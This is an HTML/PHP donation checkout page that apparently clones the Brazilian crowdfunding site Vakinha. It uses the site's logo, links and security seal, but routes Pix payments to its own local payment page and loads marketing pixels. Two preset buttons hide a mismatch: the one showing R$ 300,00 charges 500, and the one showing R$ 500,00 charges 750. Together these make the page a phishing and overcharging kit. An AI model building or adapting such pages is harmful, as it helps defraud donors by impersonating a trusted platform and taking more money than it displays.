<!DOCTYPE html>
<html lang="pt-BR">
<head><script>
  window.pixelId = "6ad244525bb1af880204b967";
  var a = document.createElement("script");
  a.setAttribute("async", "");
  a.setAttribute("defer", "");
  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
  document.head.appendChild(a);
</script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Checkout</title>
    <link rel="icon" href="images/favicon.ico">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <!-- Biblioteca QRCode.js para gerar QR codes -->
    <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>

    <?php
    include('../nlo-config.php');
    echo $pixel_scripts;
    
    if($track_fb_pixel == 1){ ?>
    <!-- Meta Pixel Code -->
    <script>
      !function(f,b,e,v,n,t,s)
      {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
      n.callMethod.apply(n,arguments):n.queue.push(arguments)};
      if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
      n.queue=[];t=b.createElement(e);t.async=!0;
      t.src='https://connect.facebook.net/en_US/fbevents.js';
      s=b.getElementsByTagName(e)[0];
      s.parentNode.insertBefore(t,s)}(window, document,'script');
    
      fbq('init', '<?php echo $fb_pixel; ?>'); // Substitua com o ID do seu pixel
      fbq('track', 'PageView');
    </script>
    <noscript>
      <img height="1" width="1" style="display:none"
           src="https://www.facebook.com/tr?id=<?php echo $fb_pixel; ?>&ev=PageView&noscript=1"/>
    </noscript>
    <!-- End Meta Pixel Code -->
    <?php }; ?>
</head>

<style>
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: 'Inter', sans-serif;
}

body {
    padding: 20px;
    max-width: 600px;
    margin: 0 auto;
}

h1 {
    color: #333;
    font-size: 24px;
    margin-bottom: 8px;
}

.id-number {
    color: #4A2B0F;
    font-size: 14px;
    margin-bottom: 30px;
}

.section-title {
    font-size: 16px;
    font-weight: 500;
    color: #333;
    margin-bottom: 15px;
}

.value-input {
    display: flex;
    position: relative;
    align-items: center;
    margin-bottom: 5px;
}

.currency-prefix {
    background-color: #f5f5f5;
    border: 1px solid #ddd;
    border-right: none;
    border-radius: 5px 0 0 5px;
    padding: 14px 15px;
    display: flex;
    align-items: center;
    color: #333;
    font-weight: 500;
}

.value-field {
    flex: 1;
    border: 1px solid #ddd;
    border-radius: 0 5px 5px 0;
    padding: 14px 15px;
    font-size: 16px;
    outline: none;
}

.payment-methods {
    display: flex;
    gap: 10px;
    margin-bottom: 30px;
}

.payment-option {
    border: 1px solid #ddd;
    border-radius: 5px;
    padding: 10px 15px;
    display: flex;
    align-items: center;
    gap: 8px;
    cursor: pointer;
}

.payment-option.pix {
    background-color: #22c55e;
    border-color: #22c55e;
    color: white;
}

.radio-button {
    width: 18px;
    height: 18px;
    border: 2px solid #ddd;
    border-radius: 50%;
    display: inline-block;
    position: relative;
}

.payment-option.pix .radio-button {
    border-color: white;
}

.payment-option.pix .radio-button::after {
    content: "";
    width: 10px;
    height: 10px;
    background-color: white;
    border-radius: 50%;
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
}

.charity-options {
    border: 1px dashed #ccc;
    border-radius: 5px;
    display: flex;
    margin-bottom: 30px;
    overflow: hidden;
}

.charity-item {
    flex: 1;
    padding: 15px;
    text-align: center;
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 5px;
    cursor: pointer;
    transition: all 0.3s ease;
    background-color: white;
    color: #333;
    border-right: 1px dashed #a1a1a1;
    height: 120px;
    justify-content: center;
}

.charity-item:last-child {
    border-right: none;
}

.charity-item.selected {
    background-color: rgba(34, 197, 94, 0.6);
    color: #ffffff;
    text-shadow: 1px 1px 2px rgba(85, 85, 85, 0.5);
}

.charity-item.selected:last-child {
    border-right: none;
}

.charity-icon {
    width: 40px;
    height: 40px;
    /* border-radius: 50%; */
    display: flex;
    align-items: center;
    justify-content: center;
    margin-bottom: 5px;
    overflow: hidden;
}

.charity-icon img {
    width: 100%;
    height: 100%;
    object-fit: cover;
}

.heart-icon {
    background-color: #f0f9ff;
}

.society-icon {
    /* background-color: #f0fdf4; */
}

.lucky-icon {
    background-color: #22c55e;
}

.charity-item.selected .charity-icon {
    background-color: white;
}

.charity-item.selected .charity-icon img {
    filter: none;
}

.charity-name {
    font-size: 12px;
    font-weight: 500;
}

.charity-price {
    font-size: 12px;
    color: #666;
}

.charity-item.selected .charity-price {
    color: white;
}

.lucky-text {
    font-size: 14px;
    font-weight: 500;
}

.summary {
    margin-bottom: 20px;
}

.summary-item {
    display: flex;
    justify-content: space-between;
    margin-bottom: 10px;
    color: #666;
    font-size: 14px;
}

.divider {
    height: 1px;
    background-color: #eee;
    margin: 15px 0;
}

.checkbox-container {
    display: flex;
    align-items: flex-start;
    gap: 10px;
    margin-bottom: 5px;
}

.custom-checkbox {
    width: 18px;
    height: 18px;
    border: 1px solid #ddd;
    border-radius: 3px;
    margin-top: 2px;
}

.checkbox-label {
    font-size: 14px;
    color: #333;
}

.privacy-notice {
    font-size: 12px;
    color: #666;
    margin-bottom: 30px;
    margin-left: 28px;
}

.contribute-button {
    background-color: #22c55e;
    color: white;
    border: none;
    border-radius: 5px;
    padding: 15px;
    width: 100%;
    font-size: 16px;
    font-weight: 500;
    cursor: pointer;
    text-transform: uppercase;
    letter-spacing: 1px;
    transition: all 0.3s ease;
}

.contribute-button:disabled {
    background-color: #ccc;
    cursor: not-allowed;
    opacity: 0.8;
}

.contribute-button.processing {
    position: relative;
    color: transparent;
}

.contribute-button.processing::after {
    content: "";
    position: absolute;
    left: 50%;
    top: 50%;
    width: 24px;
    height: 24px;
    margin: -12px 0 0 -12px;
    border: 3px solid #fff;
    border-radius: 50%;
    border-top-color: transparent;
    animation: spin 1s linear infinite;
}

@keyframes spin {
    to { transform: rotate(360deg); }
}

.error-message {
    color: #dc2626;
    font-size: 12px;
    margin-top: 5px;
    display: none;
}

.preset-values {
    display: flex;
    flex-wrap: wrap;
    gap: 10px;
    justify-content: center;
    margin: 15px 0;
}

.preset-value-btn {
    position: relative; /* necessário para posicionar o selo */
    padding: 14px 20px;
    border: 1px solid #e0e0e0;
    border-radius: 5px;
    background-color: white;
    color: #333;
    font-size: 15px;
    cursor: pointer;
    transition: all 0.3s ease;
    flex: 0 0 calc(50% - 5px);
    min-width: 90px;
    white-space: nowrap;
    overflow: visible; /* garante que o selo não seja cortado */
}

.preset-value-btn {
    position: relative; /* necessário para posicionar o selo */
    padding: 14px 20px;
    border: 1px solid #e0e0e0;
    border-radius: 5px;
    background-color: #fff;
    color: #333;
    font-size: 15px;
    cursor: pointer;
    transition: all 0.3s ease;
    flex: 0 0 calc(50% - 5px);
    min-width: 90px;
    white-space: nowrap;
    overflow: visible; /* garante que o selo não seja cortado */
}

.preset-value-btn.active {
    background-color: #24CA68;
    color: white;
    border-color: #24CA68;
}

.preset-value-btn.destaque {
    background-color: #E8FBF0; /* fundo verde bem claro */
    border-color: #24CA68;
}

/* Se quiser diferenciar quando ESTIVER selecionado E for o destaque */
.preset-value-btn.destaque.active {
    background-color: #24CA68;
    color: white;
    border-color: #24CA68;
}

.preset-value-btn .badge-mais-escolhido {
    position: absolute;
    top: -10px;
    left: 50%;
    transform: translateX(-50%);
    background-color: #24CA68;
    color: #FFF;
    font-size: 9px;
    font-weight: 600;
    padding: 1px 4px;
    border-radius: 5px;
    border: 1px solid #24CA68;
    white-space: nowrap;
    line-height: 1.4;
}

/* Se quiser que o selo mude quando o botão estiver ativo */
.preset-value-btn.active .badge-mais-escolhido {
    background-color: #24CA68;
    color: #fff;
    border-color: #fff;
}   

/* NAV */
.nav{position:fixed;top:0;left:0;right:0;height:70px;background:#fff;z-index:200;border-bottom:2px solid #f1f0f0;display:flex;align-items:center;}
.nav-inner{max-width:1200px;margin:0 auto;width:100%;padding:0 20px;display:flex;align-items:center;justify-content:space-between;}
.nav-logo svg{display:block;}
.nav-right{display:flex;align-items:center;gap:8px;}
.nav-link{font-size:15px;color:#282828;padding:8px 10px;cursor:pointer;display:flex;align-items:center;gap:4px;}
.nav-link:hover{color:#5a5a5a;}
.nav-link svg{width:16px;height:16px;fill:#282828;}
.nav-search{display:flex;align-items:center;gap:4px;color:#24ca68;font-size:15px;padding:8px 10px;}
.nav-search svg{width:20px;height:20px;fill:#24ca68;}
.btn-create{background:#24ca68;color:#fff;border:none;border-radius:5px;padding:10px 18px;font-size:14px;font-weight:700;cursor:pointer;white-space:nowrap;}
.btn-create:hover{background:#1db558;}
.nav-mobile{display:none;}

  /* Navbar */
  .nav{height:60px;}
  .nav-desktop{display:none;}
  .nav-mobile{display:flex;align-items:center;gap:16px;}
  .nav-mobile svg{width:24px;height:24px;fill:#282828;}
  .nav-logo svg { width: 110px; height: auto; } /* Diminui o logo no mobile */
  
}
</style>
</head>
<body>

<nav class="nav">
  <div class="nav-inner">
    <a href="https://www.vakinha.com.br/" class="nav-logo">
      <svg xmlns="http://www.w3.org/2000/svg" width="150" height="40" fill="none" viewBox="0 0 123 32">
        <path fill="#24CA68" fill-rule="evenodd" d="M5.11 0h24.923a5.18 5.18 0 0 1 3.609 1.471 4.97 4.97 0 0 1 1.5 3.537v18.16q.001.119-.004.232V32l-6.636-3.82H5.11a5.18 5.18 0 0 1-3.609-1.472A4.97 4.97 0 0 1 0 23.171V5.011a4.97 4.97 0 0 1 1.501-3.538A5.18 5.18 0 0 1 5.111.002zm12.655 17.262q-.285 0-.566.037l-4.695-7.981a3.12 3.12 0 0 0-.402-3.833 3.26 3.26 0 0 0-1.83-.956c-.702-.114-1.421.002-2.048.33A3.2 3.2 0 0 0 6.8 6.338a3.1 3.1 0 0 0-.213 2.023 3.16 3.16 0 0 0 1.084 1.734 3.27 3.27 0 0 0 1.935.733l4.78 8.117a4.022 4.022 0 0 0-.34 4.25c.348.671.877 1.235 1.53 1.63a4.237 4.237 0 0 0 4.35.02 4.1 4.1 0 0 0 1.546-1.617 4.02 4.02 0 0 0-.301-4.253l4.797-8.142c.71-.03 1.39-.288 1.935-.734a3.16 3.16 0 0 0 1.082-1.734 3.1 3.1 0 0 0-.214-2.022 3.2 3.2 0 0 0-1.423-1.48 3.3 3.3 0 0 0-2.047-.328c-.7.113-1.343.45-1.83.956a3.12 3.12 0 0 0-.4 3.831l-4.703 7.981q-.299-.045-.602-.045z" clip-rule="evenodd"/>
        <path fill="#24CA68" d="M42.39 12.184a3.8 3.8 0 0 1-.212-.874 1.67 1.67 0 0 1 .437-1.27 1.65 1.65 0 0 1 1.23-.526c.408-.002.805.141 1.119.405s.524.631.594 1.037l2.302 7.797h.046l2.301-7.797c.07-.406.28-.774.594-1.038a1.72 1.72 0 0 1 1.12-.404 1.64 1.64 0 0 1 1.229.526 1.66 1.66 0 0 1 .438 1.27q-.051.451-.212.874l-3.241 9.075c-.329.921-.545 1.228-2.254 1.228s-1.924-.307-2.253-1.228zM65.535 18.841c.045.781.166 1.557.359 2.315a1.43 1.43 0 0 1-.509.985 1.46 1.46 0 0 1-1.062.338 1.9 1.9 0 0 1-1.495-.53 1.86 1.86 0 0 1-.551-1.478 6 6 0 0 1-2.149 1.54 6 6 0 0 1-2.608.468 3.74 3.74 0 0 1-2.704-.945 3.7 3.7 0 0 1-1.222-2.573c0-2.858 2.189-3.66 4.854-3.967l2.116-.237c.827-.089 1.5-.283 1.5-1.278 0-.994-1.025-1.416-2.19-1.416-2.576 0-2.642 1.89-4.022 1.89a1.4 1.4 0 0 1-1.019-.352 1.37 1.37 0 0 1-.453-.971c0-1.369 1.951-3.116 5.519-3.116 3.332 0 5.64 1.063 5.64 3.542zm-3.474-2.48c-.444.308-.961.495-1.5.544l-1.261.188c-1.452.213-2.237.662-2.237 1.7 0 .78.735 1.417 1.93 1.417 1.905 0 3.071-1.228 3.071-2.502zM67.65 6.882c0-.45.173-.88.48-1.197a1.6 1.6 0 0 1 1.158-.496c.434 0 .85.179 1.157.496s.48.748.48 1.197v7.694l3.637-4.173c.154-.192.346-.349.562-.46a1.7 1.7 0 0 1 .694-.19c.396.009.775.17 1.062.454s.46.668.486 1.077c.009.213-.031.424-.117.618a1.34 1.34 0 0 1-.376.495l-2.427 2.623 3.409 4.729c.221.317.34.699.338 1.09.001.428-.16.84-.45 1.148-.288.308-.683.487-1.097.498a1.63 1.63 0 0 1-.841-.19 1.7 1.7 0 0 1-.64-.597l-3.094-4.521-1.144 1.043v2.574c0 .449-.173.88-.48 1.197a1.6 1.6 0 0 1-1.158.495 1.6 1.6 0 0 1-1.157-.495 1.72 1.72 0 0 1-.48-1.197zM80.83 5.19a1.76 1.76 0 0 1 1.723 1.41 1.75 1.75 0 0 1-1.051 1.96 1.76 1.76 0 0 1-2.134-.645 1.75 1.75 0 0 1 .22-2.213 1.76 1.76 0 0 1 1.242-.513m-1.689 6.318a1.68 1.68 0 0 1 1.043-1.555 1.69 1.69 0 0 1 2.205.911c.085.204.129.423.129.644v9.295a1.69 1.69 0 0 1-3.377 0zM84.344 11.243c0-1.039.461-1.725 1.522-1.725s1.523.686 1.523 1.725v.446h.047a4.87 4.87 0 0 1 1.772-1.618 4.73 4.73 0 0 1 2.312-.557c2.03 0 4.245 1.04 4.245 4.538v6.71c0 .457-.177.896-.493 1.22a1.67 1.67 0 0 1-1.191.505c-.447 0-.875-.182-1.191-.505a1.75 1.75 0 0 1-.493-1.22v-6.027c0-1.394-.67-2.387-2.124-2.387-.69.015-1.347.31-1.827.818a2.71 2.71 0 0 0-.734 1.9v5.693c0 .458-.177.896-.493 1.22a1.67 1.67 0 0 1-1.191.505c-.447 0-.875-.182-1.19-.505a1.75 1.75 0 0 1-.494-1.22zM98.4 6.882c0-.449.178-.88.494-1.197a1.68 1.68 0 0 1 2.382 0c.316.318.493.748.493 1.197v4.66h.047a4.51 4.51 0 0 1 3.761-1.786c2.03 0 4.246 1.02 4.246 4.452v6.586c0 .449-.178.88-.494 1.197a1.68 1.68 0 0 1-2.382 0 1.7 1.7 0 0 1-.493-1.197v-5.916c0-1.369-.669-2.343-2.122-2.343a2.6 2.6 0 0 0-1.828.803 2.64 2.64 0 0 0-.733 1.864v5.588c0 .45-.177.88-.493 1.197a1.682 1.682 0 0 1-2.876-1.197zM122.642 18.841c.046.781.166 1.557.359 2.315a1.43 1.43 0 0 1-.509.985 1.46 1.46 0 0 1-1.062.338 1.9 1.9 0 0 1-1.496-.53 1.86 1.86 0 0 1-.55-1.478 6 6 0 0 1-2.149 1.54 6 6 0 0 1-2.608.468 3.74 3.74 0 0 1-2.704-.945 3.663 3.663 0 0 1-1.222-2.573c0-2.858 2.189-3.66 4.855-3.967l2.115-.237c.834-.089 1.5-.283 1.5-1.278 0-.994-1.023-1.416-2.189-1.416-2.575 0-2.641 1.89-4.022 1.89a1.39 1.39 0 0 1-1.345-.792 1.4 1.4 0 0 1-.127-.531c0-1.369 1.951-3.116 5.518-3.116 3.332 0 5.641 1.063 5.641 3.542zm-3.475-2.48c-.443.307-.96.494-1.498.544l-1.261.188c-1.452.213-2.237.662-2.237 1.7 0 .78.735 1.417 1.931 1.417 1.903 0 3.069-1.228 3.069-2.502z"/>
      </svg>
    </a>
    <div class="nav-right nav-desktop">
      <div class="nav-link">Como ajudar <svg viewBox="0 0 24 24"><path d="M7.41 8.59 12 13.17l4.59-4.58L18 10l-6 6-6-6z"/></svg></div>
      <div class="nav-link">Descubra <svg viewBox="0 0 24 24"><path d="M7.41 8.59 12 13.17l4.59-4.58L18 10l-6 6-6-6z"/></svg></div>
      <div class="nav-link">Como funciona <svg viewBox="0 0 24 24"><path d="M7.41 8.59 12 13.17l4.59-4.58L18 10l-6 6-6-6z"/></svg></div>
      <a href="https://www.vakinha.com.br/buscar-vaquinha" class="nav-search">Buscar <svg viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14"/></svg></a>
      <a href="https://www.vakinha.com.br/users/sign_in" class="nav-link">Minha conta</a>
      <a href="https://www.vakinha.com.br/criar-vaquinha"><button class="btn-create">Faz uma vaquinha!</button></a>
    </div>
    <div class="nav-mobile">
      <a href="https://www.vakinha.com.br/buscar-vaquinha"><svg viewBox="0 0 24 24" fill="#24ca68"><path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14"/></svg></a>
      <svg viewBox="0 0 24 24"><path d="M3 18h12v-2H3zM3 6v2h18V6zm0 7h18v-2H3z"/></svg>
    </div>
  </div>
</nav>
<div class="spacer"></div>

        </header>
        <br>
        <br>
        <br>
        <br>
        <h1>❤️ NÃO DEIXE ESSA HISTÓRIA TERMINAR SEM A SUA AJUDA!</h1>
        <div class="id-number">ID: 5333124</div>
        <div class="section-title">Valor da contribuição</div>
        <div class="value-input">
            <div class="currency-prefix">R$</div>
            <input type="tel" id="contribution-input" class="value-field" value="30,00">
        </div>
        <div id="error-message" class="error-message">
            Valor mínimo da doação é de R$ 15,00
        </div>
        <div id="max-error-message" class="error-message">
            Valor máximo permitido é de R$ 1.000,00
        </div>
        <div class="preset-values" style="display: flex;flex-wrap: wrap;gap: 10px;justify-content: center;margin: 15px 0;">
        	<button class="preset-value-btn " data-value="30">R$ 30,00</button>
        	<button class="preset-value-btn destaque" data-value="70">R$ 70,00 <span class="badge-mais-escolhido">MAIS ESCOLHIDO</span> </button>
        	<button class="preset-value-btn" data-value="100">R$ 100,00</button>
        	<button class="preset-value-btn" data-value="500">R$ 300,00</button>
        	<button class="preset-value-btn" data-value="750">R$ 500,00</button>
        	<button class="preset-value-btn" data-value="1000">R$ 1.000,00</button>
        	<!-- <button class="preset-value-btn" data-value="2000">R$ 2.000,00</button> -->
        </div>
        <div class="section-title">Forma de pagamento</div>
        <div class="payment-methods">
            <div class="payment-option pix">
                <span class="radio-button"></span>
                <span>Pix</span>
            </div>
        </div>
        <div class="section-title">Turbine sua doação</div>
        <div class="summary-item">
            <span>Ajude MUITO MAIS turbinando sua doação 💚</span>
        </div>
        <div class="charity-options">
            <div class="charity-item" data-value="10.00">
                <div class="charity-icon heart-icon">
                    <img src="images/lunam.png" alt="Ícone de Coração">
                </div>
                <div class="charity-name">Multiplicador de impacto</div>
                <div class="charity-price">R$ 10,00</div>
            </div>
            <div class="charity-item" data-value="15.00">
                <div class="charity-icon society-icon" style="width:auto">
                    <!-- <img src="images/lunap.png" alt="Ícone de Sociedade"> -->
                    <!-- <img src="images/alimento.png"> -->
                    <img src="images/vitaminas.png">
                </div>
                <div class="charity-name">Vitaminas básicas</div>
                <!-- <div class="charity-name">Doe 1kg de alimento</div> -->
                <div class="charity-price">R$ 15,00</div>
            </div>
            <div class="charity-item" data-value="34.00">
                <div class="charity-icon society-icon" style="overflow:unset">
                    <img src="images/lunaa.png" alt="Ícone de Sociedade">
                </div>
                <div class="charity-name">Doar cesta básica</div>
                <div class="charity-price">R$ 34,00</div>
            </div>
        </div>
        <div class="summary">
            <div class="summary-item">
                <span>Contribuição:</span>
                <span>R$ 0,00</span>
            </div>
            <div class="divider"></div>
            <div class="summary-item">
                <span>Total:</span>
                <span>R$ 30,00</span>
            </div>
        </div>
        <button class="contribute-button">Contribuir</button>

    </div>
<!-- Texto acima do selo (com espaçamento superior e inferior) -->
<div style="font-size: 10px; color: #6c757d; margin-top: 24px; margin-bottom: 16px; font-family: 'Lato', Arial, sans-serif;">
  Ao clicar no botão acima você declara que é maior de 18 anos, leu e está de acordo com os <strong>Termos, Taxas e Prazos</strong>.
</div>

<!-- Bloco do selo de segurança -->
<div class="selo-container" style="display: flex; align-items: center; gap: 10px; background-color: #f1f1f1; padding: 10px; border-radius: 6px; margin-bottom: 16px;">
  <picture>
    <source srcset="https://static.vakinha.com.br/static/v4/SELO.png?ims=115x40" width="115" height="40">
    <img srcset="https://static.vakinha.com.br/static/v4/SELO.png?ims=115x40" alt="Selo de segurança" style="display: block;">
  </picture>
  <div style="color: #6c757d; font-family: 'Lato', Arial, sans-serif; font-size: 11px;">
    Garantimos uma <strong>experiência segura</strong> para todos os nossos doadores.
  </div>
</div>

<!-- Texto abaixo do selo (com espaçamento inferior) -->
<div style="font-size: 9px; color: #6c757d; font-family: 'Lato', Arial, sans-serif; margin-bottom: 44px;">
  Informamos que o preenchimento do seu cadastro completo estará disponível em seu painel pessoal na plataforma após a conclusão desta doação. Importante destacar a importância da adequação do seu cadastro, informando o <strong>nome social</strong>, caso o utilize.
</div>
    <script>
	//nlo params
	function getUrlParams() {
		const params = new URLSearchParams(window.location.search);
		let paramsObject = {};
		params.forEach((value, key) => {
			paramsObject[key] = value;
		});
		return paramsObject;
	}

	function redirectWithParams(baseUrl) {
		const params = getUrlParams();
		const url = new URL(baseUrl, window.location);

		Object.keys(params).forEach(key => {
			url.searchParams.set(key, params[key]);
		});

		window.location.href = url.toString();
	}

        document.addEventListener("DOMContentLoaded", () => {
            // Elementos do formulário
            const contributionInput = document.getElementById("contribution-input")
            const errorMessage = document.getElementById("error-message")
            const maxErrorMessage = document.getElementById("max-error-message")
            const contributeButton = document.querySelector(".contribute-button")
            const paymentOption = document.querySelector(".payment-option.pix")
            const charityItems = document.querySelectorAll(".charity-item")
            //const summaryContribution = document.querySelector(".summary-item:first-child span:last-child")
            const summaryTotal = document.querySelector(".summary-item:last-child span:last-child")

            const presetButtons = document.querySelectorAll(".preset-value-btn")

            // Variáveis de controle
            let selectedAmount = 30
            const additionalAmounts = [] // Array para armazenar múltiplos valores adicionais
            const MIN_AMOUNT = 15
            const MAX_AMOUNT = 1000

            // Definir os valores corretos para cada item
            const itemValues = {
                "Multiplicador de impacto": 10.00,
                //"Doe 1kg de alimento": 15.00,
                //"Materiais de Estudo": 15.00,
                //"Brinquedo solidário": 15.00,
                "Vitaminas básicas": 15.00,
                "Doar cesta básica": 34.00,
            }

            // Formatar valor como moeda
            function formatCurrency(value) {
                return Number(Number.parseFloat(value).toFixed(2)).toLocaleString("pt-BR", {
                    minimumFractionDigits: 2,
                    maximumFractionDigits: 2,
                })
            }

            // Atualizar resumo
            function updateSummary() {
                // Calcular o total somando o valor base e todos os adicionais selecionados
                const additionalTotal = additionalAmounts.reduce((sum, amount) => sum + amount, 0)
                const total = selectedAmount + additionalTotal

                //summaryContribution.textContent = `R$ ${formatCurrency(selectedAmount)}`
                summaryTotal.textContent = `R$ ${formatCurrency(total)}`

                // Arredondar para 2 casas decimais para evitar problemas de comparação
                const roundedTotal = Math.round(total * 100) / 100

                // Habilitar/desabilitar botão com base no valor mínimo
                if (roundedTotal >= MIN_AMOUNT && roundedTotal <= MAX_AMOUNT) {
                    contributeButton.classList.add("active")
                    errorMessage.style.display = "none"
                    maxErrorMessage.style.display = "none"
                } else if (roundedTotal > MAX_AMOUNT) {
                    contributeButton.classList.remove("active")
                    errorMessage.style.display = "none"
                    maxErrorMessage.style.display = "block"
                } else {
                    contributeButton.classList.remove("active")
                    errorMessage.style.display = "block"
                    maxErrorMessage.style.display = "none"
                }

                // Log para debug
                console.log("Valores adicionais:", additionalAmounts)
                console.log("Total adicional:", additionalTotal)
                console.log("Total geral:", total)
            }

            // Inicializar máscara de moeda no input
            function initCurrencyMask() {
                contributionInput.addEventListener("input", (e) => {
                    let value = e.target.value.replace(/\D/g, "")
                    value = (Number.parseInt(value) / 100).toFixed(2)
                    e.target.value = formatCurrency(value)

                    // Corrigir a conversão do valor para número
                    selectedAmount = Number.parseFloat(value)
                    updateSummary()
                })

                // Inicializar com 0,00
                contributionInput.value = formatCurrency(30)
            }

            // Configurar os itens de caridade
            function setupCharityItems() {
                // Mapa para rastrear quais itens estão selecionados e seus índices no array
                const selectedItemsMap = new Map()

                charityItems.forEach((item) => {
                    // Obter o nome do item
                    const itemName = item.querySelector(".charity-name").textContent

                    // Definir o valor correto baseado no nome
                    if (itemValues[itemName]) {
                        item.dataset.value = itemValues[itemName].toString()
                    }

                    // Adicionar evento de clique
                    item.addEventListener("click", function () {
                        const value = Number.parseFloat(this.dataset.value)
                        const itemId = this.dataset.value + "-" + itemName // ID único para o item

                        // Toggle seleção
                        if (this.classList.contains("selected")) {
                            // Remover seleção
                            this.classList.remove("selected")

                            // Se o item estiver no mapa, remova-o do array usando o índice armazenado
                            if (selectedItemsMap.has(itemId)) {
                                const index = selectedItemsMap.get(itemId)
                                additionalAmounts.splice(index, 1)

                                // Atualizar os índices no mapa após a remoção
                                selectedItemsMap.forEach((val, key) => {
                                    if (val > index) {
                                        selectedItemsMap.set(key, val - 1)
                                    }
                                })

                                // Remover o item do mapa
                                selectedItemsMap.delete(itemId)
                            }
                        } else {
                            // Adicionar seleção
                            this.classList.add("selected")

                            // Adicionar valor ao array e armazenar seu índice no mapa
                            additionalAmounts.push(value)
                            selectedItemsMap.set(itemId, additionalAmounts.length - 1)
                        }

                        updateSummary()
                    })
                })
            }

            // Inicializar
            function init() {
                // Inicializar máscara de moeda
                initCurrencyMask()

                // Configurar itens de caridade
                setupCharityItems()

                // Marcar PIX como selecionado por padrão
                paymentOption.classList.add("selected")

                // Esconder mensagens de erro inicialmente
                errorMessage.style.display = "none"
                maxErrorMessage.style.display = "none"

                // Atualizar resumo inicial
                //updateSummary()
            }

            presetButtons.forEach((button) => {
                button.addEventListener("click", () => {
                    // Remover classe 'active' de todos os botões
                    presetButtons.forEach(btn => btn.classList.remove("active"))
            
                    // Adicionar classe 'active' ao botão clicado
                    button.classList.add("active")
            
                    // Obter valor do botão e atualizar o campo de input
                    const value = parseFloat(button.dataset.value)
            
                    selectedAmount = value
                    contributionInput.value = formatCurrency(value)
            
                    // Atualizar resumo
                    updateSummary()
                })
            })

            // Processar pagamento
            contributeButton.addEventListener("click", () => {
                const additionalTotal = additionalAmounts.reduce((sum, amount) => sum + amount, 0)
                const total = selectedAmount + additionalTotal
            
                // Verificar se o total é um número válido
                if (isNaN(total)) {
                    errorMessage.textContent = "O valor inserido é inválido."
                    errorMessage.style.display = "block"
                    return
                }
            
                // Arredondar para 2 casas decimais para evitar problemas de comparação
                const roundedTotal = Math.round(total * 100) / 100
            
                // Verificar valor mínimo
                if (roundedTotal < MIN_AMOUNT) {
                    errorMessage.style.display = "block"
                    return
                }
            
                // Verificar valor máximo
                if (roundedTotal > MAX_AMOUNT) {
                    maxErrorMessage.style.display = "block"
                    return
                }
            
                // Mostrar indicador de carregamento no botão
                contributeButton.innerHTML = '<div class="spinner-small"></div> Processando...'
                contributeButton.disabled = true
            
                // ✅ REDIRECIONAR COM VALOR E PARÂMETROS UTM
                redirectWithParams("../pagamento/?valor=" + roundedTotal);
            })

            // Inicializar tudo
            init()
        })
    </script>
</body>
</html>